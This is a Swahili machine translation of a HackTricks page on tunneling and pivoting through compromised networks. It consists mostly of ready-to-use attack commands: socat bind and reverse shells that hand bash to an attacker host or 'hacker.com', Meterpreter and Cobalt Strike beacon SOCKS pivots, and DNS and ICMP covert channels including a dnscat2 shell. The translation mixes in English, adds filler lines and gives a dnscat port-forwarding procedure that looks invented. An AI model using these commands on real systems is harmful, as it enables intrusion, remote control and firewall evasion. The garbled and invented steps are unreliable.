# Kuchimba na Kusogeza Bandari

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Vidokezo vya Nmap

{% hint style="warning" %}
Uchunguzi wa **ICMP** na **SYN** hauwezi kuchimbwa kupitia proksi za socks, kwa hivyo tunapaswa **kuzima ugunduzi wa ping** (`-Pn`) na kutoa maelezo ya **uchunguzi wa TCP** (`-sT`) ili hii ifanye kazi.
{% endhint %}

## **Bash**

**Mwenyeji -> Kukimbilia -> NdaniA -> NdaniB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Unganisho la picha la SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Port2Port ya Ndani

Fungua bandari mpya kwenye Seva ya SSH --> Bandari nyingine
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Kituo cha ndani --> Mwenyeji ulioghushiwa (SSH) --> Sanduku la tatu:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port ya Ndani --> Mwenyeji ulioathiriwa (SSH) --> Popote
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Kusonga Mbele Kwa Bandari Nyuma

Hii ni muhimu kupata mabakuli ya nyuma kutoka kwa watumishi wa ndani kupitia DMZ hadi kwenye kompyuta yako:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Unahitaji **mamlaka ya msingi kwenye vifaa vyote** (kwa kuwa utaunda viunganishi vipya) na usanidi wa sshd lazima uwezeshe kuingia kama root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Ruhusu mbele kwenye upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka njia mpya upande wa mteja
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Unaweza **kutumia njia ya kuficha** kupitia **ssh** trafiki yote kwenye **mtandao mdogo** kupitia mwenyeji. Kwa mfano, kupeleka trafiki yote inayoelekea 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Hakuna tafsiri inayohitajika kwa sehemu hii ya maandishi.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Port ya ndani --> Kifaa kilichodukuliwa (kikao hai) --> Sanduku la tatu:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
SOCKS ni itifaki ya mtandao inayotumiwa kwa kusudi la kuwezesha tunneling na port forwarding. Inaruhusu watumiaji kuunganisha na seva ya proxy na kisha kupeleka trafiki yao kupitia seva hiyo. Hii inawezesha watumiaji kuficha anwani zao za IP halisi na kufikia rasilimali za mtandao ambazo zinaweza kuwa vikwazo kwa anwani zao za IP. SOCKS inasaidia matoleo mbalimbali kama vile SOCKS4, SOCKS4a, na SOCKS5. SOCKS5 ni toleo la hivi karibuni na linaleta sifa za ziada kama vile uthibitishaji wa watumiaji na encryption ya trafiki.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Fungua bandari katika timu ya seva inayosikiliza kwenye interface zote ambazo zinaweza kutumika kupeleka trafiki kupitia beacon.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Katika kesi hii, **bandari inafunguliwa kwenye mwenyeji wa beacon**, sio kwenye Seva ya Timu na trafiki inatumwa kwenye Seva ya Timu na kutoka hapo kwenda kwenye mwenyeji: bandari iliyotajwa
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Kuwa makini:

- Kusudi la kusonga mbele la Beacon ni kubuniwa kwa ajili ya **kutuma trafiki kwenye Seva ya Timu, sio kwa ajili ya kuhamisha kati ya mashine binafsi**.
- Trafiki ina **kutumwa kwa njia ya kusonga mbele ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
- **Hakuna mahitaji ya mamlaka ya usimamizi** ili kuunda mbele ya kusonga kwa kubadilishana kwenye bandari za juu.

### rPort2Port ya ndani

{% hint style="warning" %}
Katika kesi hii, **bandari inafunguliwa kwenye mwenyeji wa beacon**, sio kwenye Seva ya Timu na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Seva ya Timu) na kutoka hapo kwenye mwenyeji:bandari iliyotajwa
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Unahitaji kupakia faili ya wavuti ya tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa matoleo ya [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Unahitaji kutumia **toleo lile lile kwa mteja na seva**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Kusambaza Bandari

Port forwarding ni mbinu ya kusambaza trafiki kutoka kwa bandari moja hadi nyingine kwenye mtandao. Inaruhusu uhusiano wa moja kwa moja kati ya kompyuta mbili au zaidi, hata kama ziko nyuma ya mitandao tofauti au firewalls.

Kuna aina mbili za port forwarding: **local port forwarding** na **remote port forwarding**.

#### Local Port Forwarding

Katika local port forwarding, trafiki kutoka kwa bandari ya kompyuta ya mteja inaelekezwa kwenye bandari ya kompyuta ya seva. Hii inaruhusu mteja kufikia huduma zilizopo kwenye seva kupitia bandari ya kompyuta yake mwenyewe.

Kwa mfano, ikiwa mteja anataka kufikia tovuti iliyohifadhiwa kwenye seva ya kampuni, wanaweza kutumia local port forwarding ili kusambaza trafiki kutoka bandari yao ya ndani kwenda bandari ya seva ya kampuni.

#### Remote Port Forwarding

Katika remote port forwarding, trafiki kutoka kwa bandari ya seva inaelekezwa kwenye bandari ya kompyuta ya mteja. Hii inaruhusu seva kufikia huduma zilizopo kwenye kompyuta ya mteja kupitia bandari ya seva.

Kwa mfano, ikiwa mteja anataka kufanya upatikanaji wa mbali kwenye kompyuta yao ya nyumbani, wanaweza kutumia remote port forwarding ili kusambaza trafiki kutoka bandari ya seva kwenda bandari ya kompyuta yao ya nyumbani.

#### Matumizi ya Port Forwarding

Port forwarding ina matumizi mengi katika uwanja wa udukuzi na upimaji wa usalama. Inaweza kutumika kwa:

- Kupata upatikanaji wa mbali kwenye kompyuta zilizofichwa nyuma ya mitandao ya ndani au firewalls.
- Kusambaza trafiki ya mtandao kupitia njia zisizo salama.
- Kupenya kwenye mitandao ya ndani na kufikia vifaa vya ndani.
- Kuanzisha mawasiliano ya moja kwa moja kati ya kompyuta mbili zilizoko kwenye mitandao tofauti.

Port forwarding ni mbinu muhimu katika uwanja wa udukuzi na inaweza kutumiwa kwa njia mbalimbali ili kufikia malengo ya udukuzi.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Tuneli ya kurudi. Tuneli huanza kutoka kwa mwathirika.\
Socks4 proxy inaundwa kwenye 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Kifaa cha Kufunga
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Kitanzi cha Nyuma

Kitanzi cha nyuma ni mbinu ya kawaida katika udukuzi ambapo mshambuliaji anapata udhibiti wa kijijini juu ya mfumo uliolengwa. Katika kitanzi cha nyuma, mfumo uliolengwa huanzisha uhusiano na mshambuliaji, badala ya mshambuliaji kuanzisha uhusiano na mfumo uliolengwa.

Mchakato wa kuanzisha kitanzi cha nyuma unahusisha hatua zifuatazo:

1. Mshambuliaji huanzisha seva ya kusikiliza kwenye mfumo wake.
2. Mshambuliaji hutoa payload (kifurushi cha programu hasidi) kwa mfumo uliolengwa.
3. Mfumo uliolengwa hupokea payload na kuiendesha.
4. Payload inajenga uhusiano na seva ya kusikiliza ya mshambuliaji.
5. Mshambuliaji anapata udhibiti wa kijijini juu ya mfumo uliolengwa kupitia uhusiano huu.

Kitanzi cha nyuma ni mbinu yenye nguvu ambayo inaruhusu mshambuliaji kutekeleza amri na kudhibiti mfumo uliolengwa kutoka mahali popote duniani. Ni muhimu kwa wadukuzi kujua jinsi ya kuanzisha na kutumia kitanzi cha nyuma kwa ufanisi.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

Port2Port ni mbinu ya kusafirisha trafiki kutoka kwenye bandari moja hadi nyingine kwenye mtandao. Inaweza kutumika kwa kusudi la kuficha trafiki, kufikia huduma zilizofungwa, au kufanya uchunguzi wa usalama.

Kuna njia kadhaa za kutekeleza Port2Port, ikiwa ni pamoja na:

- **Port Forwarding**: Hii ni mbinu ya kawaida ya Port2Port ambapo trafiki kutoka kwenye bandari moja ya chanzo inaelekezwa kwenye bandari ya marudio kwa kutumia router au firewall. Hii inaruhusu mtumiaji kufikia huduma kwenye bandari ya marudio bila kujali vizuizi vya mtandao.

- **Reverse Tunneling**: Hii ni mbinu ambapo trafiki kutoka kwenye bandari ya chanzo inaelekezwa kwenye bandari ya marudio kupitia seva ya kati. Hii inaweza kutumika kwa kusudi la kufikia huduma zilizofungwa au kuficha asili ya trafiki.

- **SSH Tunneling**: Hii ni mbinu ambapo trafiki inasafirishwa kupitia SSH (Secure Shell) kwa kutumia bandari ya chanzo na bandari ya marudio. Hii inaruhusu ufikiaji salama wa huduma zilizofungwa au kuficha trafiki.

Port2Port ni mbinu muhimu katika uwanja wa uchunguzi wa usalama na inaweza kutumika kwa njia mbalimbali kulingana na malengo ya mtumiaji.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks

Kuna njia mbalimbali za kufanya port2port kupitia socks. Hapa nitaelezea njia mbili za kawaida:

#### 1. Kutumia SSH Tunnel

Ili kufanya port2port kupitia socks kwa kutumia SSH tunnel, unahitaji kufuata hatua zifuatazo:

1. Anza kuanzisha SSH tunnel kwa kutumia amri ifuatayo:

```bash
ssh -D <local_port> -p <ssh_port> <username>@<ssh_server>
```

2. Baada ya kuanzisha SSH tunnel, unaweza kutumia programu yoyote ambayo inasaidia kuweka proxy kwa kusanidi mteja wa socks kwa kutumia maelezo yafuatayo:

   - Server: `localhost` au `127.0.0.1`
   - Port: `<local_port>` (ambayo uliweka katika hatua ya kwanza)

3. Sasa unaweza kuanzisha uhusiano wa port2port kupitia socks kwa kutumia programu yako ya mteja.

#### 2. Kutumia Proxychains

Proxychains ni chombo kinachoruhusu kutumia socks proxy kwa programu yoyote. Unaweza kufuata hatua zifuatazo:

1. Sakinisha proxychains kwenye mfumo wako.

2. Fungua faili ya konfigurisheni ya proxychains (`/etc/proxychains.conf` au `/usr/local/etc/proxychains.conf`) na uhariri maelezo yafuatayo:

   - Ongeza maelezo ya socks proxy kwa kuongeza mstari ufuatao:
     ```
     socks4 127.0.0.1 <local_port>
     ```
   - Hakikisha kuwa mstari wa `dynamic_chain` umewekwa kama `dynamic_chain`.

3. Baada ya kuhariri faili ya konfigurisheni, unaweza kutumia programu yoyote na kuifunga na proxychains kwa kutumia amri ifuatayo:
   ```bash
   proxychains <program_name>
   ```

   Programu hiyo sasa itatumia socks proxy uliyoanzisha kwa port2port.

Hizi ni njia mbili za kawaida za kufanya port2port kupitia socks. Unaweza kuchagua njia inayofaa zaidi kulingana na mazingira yako na mahitaji yako.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat

Kuna njia nyingi za kufanya tunneling na kusonga trafiki ya mtandao kupitia bandari zilizofungwa au kizuizi cha mtandao. Moja ya njia hizi ni kutumia SSL Socat kwa kusonga Meterpreter kupitia bandari iliyofungwa.

Kwanza, tunahitaji kuanzisha SSL Socat kwenye mashine ya kudhibiti (C2) na kusikiliza kwenye bandari ya SSL. Hii inaweza kufanywa kwa kutumia amri ifuatayo:

```plaintext
socat openssl-listen:443,reuseaddr,fork,cert=server.pem,verify=0 -
```

Baada ya hapo, tunahitaji kuanzisha kipokezi cha Meterpreter kwenye mashine ya lengo (target) na kuunganisha kwenye bandari ya SSL ya C2. Hii inaweza kufanywa kwa kutumia amri ifuatayo:

```plaintext
meterpreter > portfwd add -l 443 -p 443 -r <C2_IP>
```

Sasa, tunaweza kuunganisha kwenye Meterpreter kwenye mashine ya lengo kwa kutumia SSL Socat. Hii inaweza kufanywa kwa kutumia amri ifuatayo:

```plaintext
socat openssl:<target_IP>:443,verify=0 -
```

Baada ya hapo, tunaweza kufanya operesheni za kawaida za Meterpreter kwenye mashine ya lengo kupitia SSL Socat.

Kumbuka: Usalama wa SSL Socat unategemea ufungaji sahihi wa cheti cha SSL. Ni muhimu kuhakikisha kuwa cheti cha SSL kinatolewa na mamlaka ya kuaminika na kimefungwa vizuri ili kuzuia uwezekano wa shambulio la kati (man-in-the-middle attack).
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kuzunguka **proxy isiyothibitishwa** kwa kutekeleza mstari huu badala ya wa mwisho kwenye konsoli ya mwathirika:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tuneli ya SSL ya Socat

**/bin/sh konsoli**

Tengeneza vyeti kwenye pande zote mbili: Mteja na Seva
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Uunganishaji wa Port2Port wa Mbali

Weka uhusiano wa bandari ya SSH ya ndani (22) kwenye bandari ya 443 ya mwenyeji wa mshambuliaji
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Ni kama toleo la PuTTY la kawaida (chaguo zake ni sawa na mteja wa ssh).

Kwa kuwa faili hii itatekelezwa kwenye kifaa cha mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na uhusiano wa kurudi nyuma. Kisha, ili kusambaza tu bandari inayopatikana kwa kifaa cha ndani kwenye kifaa chetu:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Unahitaji kuwa na mamlaka ya ndani (kwa ajili ya bandari yoyote)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **upatikanaji wa RDP kwenye mfumo**.\
Pakua:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Zana hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya Mbali ya Windows. DVC inahusika na **kutuma pakiti kupitia uhusiano wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** kwa **mwathiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kidhibiti** kinachosema kuwa **programu-jalizi ya SocksOverRDP imeamilishwa**, na itakuwa **ikisikiliza** kwenye **127.0.0.1:1080**.

**Unge** kupitia **RDP** na kupakia na kutekeleza kwenye kompyuta ya mwathiriwa faili ya `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, hakikisha kwenye kompyuta yako (mshambuliaji) kwamba bandari ya 1080 inasikiliza:
```
netstat -antb | findstr 1080
```
Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupitia trafiki kupitia bandari hiyo.**

## Proxify Programu za Windows GUI

Unaweza kufanya programu za Windows GUI zinazunguka kupitia proksi kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
Katika **Profile -> Proxification Rules** ongeza jina la programu ya kufanywa proksi na uhusiano kwa IP unayotaka kufanywa proksi.

## Kupitisha kizuizi cha proksi cha NTLM

Zana iliyotajwa hapo awali: **Rpivot**\
**OpenVPN** pia inaweza kusaidia, kwa kuweka chaguo hizi katika faili ya usanidi:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Inathibitisha utambulisho dhidi ya wakala na kubana bandari kwa upande wa ndani ambayo inaelekezwa kwa huduma ya nje unayotaja. Kisha, unaweza kutumia chombo cha uchaguzi wako kupitia bandari hii.\
Kwa mfano, inabana bandari 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, ikiwa unaweka kwa mfano kwenye mwathiriwa huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuunganisha kupitia bandari ya mshambuliaji 2222.\
Unaweza pia kutumia **meterpreter** ambayo inaunganisha kwenye localhost:443 na mshambuliaji anasikiliza kwenye bandari 2222.

## YARP

Kiproksi cha kurudisha kilichoundwa na Microsoft. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Mizizi inahitajika kwenye mifumo yote kuunda ada za tun na kusambaza data kati yao kwa kutumia maswali ya DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunnel hii itakuwa polepole sana. Unaweza kuunda uhusiano wa SSH uliopunguzwa kupitia tunnel hii kwa kutumia:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pakua hapa**](https://github.com/iagox86/dnscat2)**.**

Inajenga njia ya C\&C kupitia DNS. Haina haja ya mamlaka ya msingi.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha mteja wa dnscat2 katika powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Kusambaza Bandari na dnscat**

Port forwarding is a technique used to redirect network traffic from one port to another. It can be useful in various scenarios, such as accessing a service running on a remote machine through a firewall or NAT device.

Dnscat is a tool that allows you to create a covert communication channel by encapsulating data within DNS queries and responses. It can be used for various purposes, including bypassing firewalls and exfiltrating data from a target network.

To perform port forwarding with dnscat, follow these steps:

1. Set up a dnscat server on a machine with a public IP address. This will act as the relay between the client and the target machine.

2. Configure the DNS settings of the target machine to use the dnscat server as its primary DNS server.

3. Start the dnscat server and specify the port you want to forward traffic to. For example, if you want to forward traffic from port 8080 to the target machine, you would run the following command:

   ```
   dnscat --dns <dnscat_server_ip> --dns-port <dnscat_server_port> --forward <target_ip>:8080
   ```

   Replace `<dnscat_server_ip>` with the IP address of the dnscat server and `<dnscat_server_port>` with the port number it is listening on.

4. On the client machine, start the dnscat client and specify the dnscat server IP address and port number. For example:

   ```
   dnscat --dns <dnscat_server_ip> --dns-port <dnscat_server_port>
   ```

   Replace `<dnscat_server_ip>` with the IP address of the dnscat server and `<dnscat_server_port>` with the port number it is listening on.

5. Once the client is connected to the dnscat server, you can access the target machine's service by connecting to the specified port on the client machine. The traffic will be forwarded to the target machine through the dnscat server.

Port forwarding with dnscat can be a powerful technique for bypassing network restrictions and accessing services on remote machines. However, it is important to use this technique responsibly and with proper authorization.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Badilisha DNS ya proxychains

Proxychains inakamata wito wa libc wa `gethostbyname` na kusafirisha ombi la DNS la tcp kupitia soksi ya proxy. Kwa **chaguo-msingi**, seva ya **DNS** ambayo proxychains hutumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kubadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika mazingira ya **Windows**, unaweza kuweka IP ya **domain controller**.

## Mifereji katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Tunnels ya ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Inahitajika kuwa na mizizi kwenye mifumo yote mawili ili kuunda ada za tun na kusafirisha data kati yao kwa kutumia ombi la ICMP echo.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pakua hapa**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) ni zana ya kuwezesha ufikiaji wa suluhisho kwenye mtandao kwa kutumia amri moja tu.**
*URI ya ufikiaji ni kama:* **UID.ngrok.io**

### Ufungaji

- Unda akaunti: https://ngrok.com/signup
- Pakua mteja:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi ya Msingi

**Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Pia ni muhimu kuongeza uthibitishaji na TLS, ikiwa ni lazima.*

#### Kuchimba TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kufichua faili kwa kutumia HTTP

One way to expose files on a target machine is by using HTTP. This can be done by setting up a simple HTTP server on your machine and then using a tunneling technique to forward traffic from the target machine to your machine.

